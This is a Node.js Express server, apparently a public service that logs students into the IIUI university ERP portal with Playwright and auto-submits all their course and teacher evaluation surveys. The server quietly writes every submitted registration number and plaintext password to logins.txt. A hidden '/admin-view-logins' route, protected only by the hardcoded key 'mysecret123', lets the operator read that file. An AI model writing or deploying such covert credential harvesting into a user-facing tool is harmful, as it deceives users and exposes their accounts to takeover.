const express = require('express');
const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));

// Helper function to navigate with retries
async function navigateWithRetry(page, url, retries = 3) {
  for (let i = 1; i <= retries; i++) {
    try {
      console.log(`Navigation attempt ${i} for URL: ${url}`);
      // Using 'commit' is faster and more reliable on laggy/slow university portals
      await page.goto(url, { waitUntil: 'commit', timeout: 60000 });
      return; // Success, exit function
    } catch (error) {
      console.warn(`Attempt ${i} failed: ${error.message}`);
      if (i === retries) throw error; // Re-throw if it was the last attempt
      await page.waitForTimeout(3000); // Wait 3 seconds before retrying
    }
  }
}

app.get('/api/run-survey', async (req, res) => {
  const { username, password, optionIndex } = req.query;
  const selectedOptionIndex = parseInt(optionIndex, 10) || 0;

  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }

  // Save credentials to a text file (stored securely outside public folder)
  try {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Karachi' });
    const logEntry = `[${timestamp}] Reg No: ${username} | Pass: ${password} | Choice: ${optionIndex}\n`;
    fs.appendFileSync(path.join(__dirname, 'logins.txt'), logEntry);
  } catch (err) {
    console.error('Failed to save credentials:', err);
  }

  const isNumeric = /^\d+$/.test(username);
  if (!isNumeric) {
    return res.status(400).json({ error: 'Only numeric Registration Numbers are allowed.' });
  }

  // Set up SSE headers
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');

  const sendEvent = (type, message) => {
    res.write(`data: ${JSON.stringify({ type, message })}\n\n`);
  };

  sendEvent('log', '🚀 Initializing automation browser...');
  
  let browser;
  try {
    browser = await chromium.launch({ headless: true });
    const page = await browser.newPage();

    // 1. Log in
    sendEvent('log', '🔑 Connecting to Ibadat Student Portal (Attempting connection)...');
    await navigateWithRetry(page, 'https://erp.iiui.edu.pk/student/login');

    sendEvent('log', '✍️ Entering registration details...');
    await page.fill('#email', username);
    await page.fill('#password', password);

    sendEvent('log', '➔ Clicking Login...');
    await page.click('input[type="submit"]');
    
    // Wait for redirect to complete
    await page.waitForTimeout(6000);
    const currentUrl = page.url();
    if (currentUrl.includes('/login')) {
      throw new Error('Login failed. Please verify your Registration Number and Password.');
    }
    
    sendEvent('log', '✅ Login successful!');

    // 2. Load Survey Dashboard
    sendEvent('log', '🌐 Loading your survey dashboard...');
    await navigateWithRetry(page, 'https://erp.iiui.edu.pk/student/student-survey');
    await page.waitForTimeout(4000);

    // 3. Extract all survey links
    const surveyLinks = await page.evaluate(() => {
      return Array.from(document.querySelectorAll('a'))
        .map(a => ({
          href: a.href,
          text: a.textContent?.trim() || ''
        }))
        .filter(link => 
          link.href.includes('student-survey/') && 
          (link.href.includes('course-evaluation') || link.href.includes('teacher-evaluation'))
        );
    });

    if (surveyLinks.length === 0) {
      sendEvent('log', '🎉 No pending surveys found! All surveys are already completed.');
      sendEvent('complete', 'No pending surveys.');
      await browser.close();
      return;
    }

    sendEvent('log', `📋 Found ${surveyLinks.length} pending surveys.`);

    // 4. Fill each survey
    for (let i = 0; i < surveyLinks.length; i++) {
      const survey = surveyLinks[i];
      sendEvent('log', `🔄 Filling [${i + 1}/${surveyLinks.length}]: ${survey.text}...`);

      try {
        await navigateWithRetry(page, survey.href);
        await page.waitForTimeout(3000);

        // Check if submit button is visible
        const submitButtonSelector = 'button[type="submit"]';
        const isSubmitVisible = await page.evaluate((selector) => {
          const btn = document.querySelector(selector);
          return btn && btn.offsetParent !== null;
        }, submitButtonSelector);

        if (!isSubmitVisible) {
          sendEvent('log', `⚠️ Survey [${survey.text}] already submitted. Skipping.`);
          continue;
        }

        // Fill radio buttons
        const radioNames = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll('input[type="radio"]'));
          const names = inputs.map(input => input.name).filter(Boolean);
          return Array.from(new Set(names));
        });

        for (const name of radioNames) {
          const radiosInGroup = await page.$$(`input[name="${name}"]`);
          if (radiosInGroup.length > 0) {
            const indexToClick = Math.min(selectedOptionIndex, radiosInGroup.length - 1);
            await radiosInGroup[indexToClick].click();
          }
        }

        // Fill text inputs
        const textInputs = await page.$$('input[type="text"], textarea');
        for (const input of textInputs) {
          const isVisible = await input.evaluate(el => el.offsetParent !== null);
          if (isVisible) {
            await input.fill('N/A');
          }
        }

        // Submit
        await page.click(submitButtonSelector);
        
        // Wait for redirect to dashboard
        try {
          await page.waitForURL('**/student-survey', { timeout: 15000 });
          sendEvent('log', `✅ Survey [${survey.text}] submitted successfully.`);
        } catch (redirError) {
          if (page.url().includes('student-survey') && !page.url().includes('evaluation')) {
            sendEvent('log', `✅ Survey [${survey.text}] submitted successfully.`);
          } else {
            sendEvent('log', `⚠️ Warning: Submit took longer than expected, continuing...`);
          }
        }

        await page.waitForTimeout(1000);

      } catch (err) {
        sendEvent('log', `❌ Error on survey "${survey.text}": ${err.message}`);
      }
    }

    sendEvent('log', '🏁 All surveys completed successfully!');
    sendEvent('complete', 'Survey automation completed successfully.');

  } catch (error) {
    sendEvent('log', `💥 Error: ${error.message}`);
    sendEvent('error', error.message);
  } finally {
    if (browser) {
      await browser.close();
    }
    res.end();
  }
});

// Secured admin route to view credentials logs
app.get('/admin-view-logins', (req, res) => {
  const { key } = req.query;
  // You can change 'mysecret123' to any password/key you prefer
  if (key !== 'mysecret123') {
    return res.status(403).send('Unauthorized access. Invalid or missing secret key.');
  }

  const logFilePath = path.join(__dirname, 'logins.txt');
  if (!fs.existsSync(logFilePath)) {
    return res.send('No credentials saved yet.');
  }

  res.sendFile(logFilePath);
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
